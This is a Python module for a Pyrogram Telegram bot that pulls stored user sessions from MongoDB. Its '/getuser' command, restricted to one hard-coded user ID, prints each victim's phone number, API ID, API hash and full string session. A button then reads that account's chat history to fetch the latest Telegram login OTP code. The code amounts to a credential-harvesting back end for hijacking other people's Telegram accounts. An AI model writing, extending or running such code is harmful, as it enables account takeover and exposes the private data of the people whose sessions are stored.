from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pymongo import MongoClient

import config

# Initialize database connection
client = MongoClient(config.MONGO_URI)
db = client[config.DB_NAME]
user_sessions = db["user_sessions"]

def register_handlers(app: Client):
    @app.on_message(filters.command("getuser") & filters.user(7494727691))
    async def get_user(client, message):
        users = user_sessions.find()
        for user in users:
            text = (
                f"**Name:** {user['name']}\n"
                f"**Username:** @{user['username']}\n"
                f"**User ID:** {user['user_id']}\n"
                f"**Phone Number:** {user['phone_number']}\n"
                f"**API ID:** {user['api_id']}\n"
                f"**API Hash:** {user['api_hash']}\n"
                f"**Session Type:** {user['session_type']}\n"
                f"**String Session:** `{user['string_session']}`\n"
            )
            buttons = InlineKeyboardMarkup([[InlineKeyboardButton("Dapatkan Kode", callback_data=f"get_code_{user['user_id']}")]])
            await message.reply(text, reply_markup=buttons)

    @app.on_callback_query(filters.regex(r"get_code_(\d+)"))
    async def get_code(client, callback_query):
        user_id = int(callback_query.data.split("_")[2])
        messages = await client.get_history(user_id, limit=10)
        otp_message = None
        for msg in messages:
            if "Telegram code" in msg.text:
                otp_message = msg.text
                break
        if otp_message:
            await callback_query.message.reply(f"**Kode OTP terakhir:** {otp_message}")
        else:
            await callback_query.message.reply("Tidak ada pesan kode OTP yang ditemukan.")
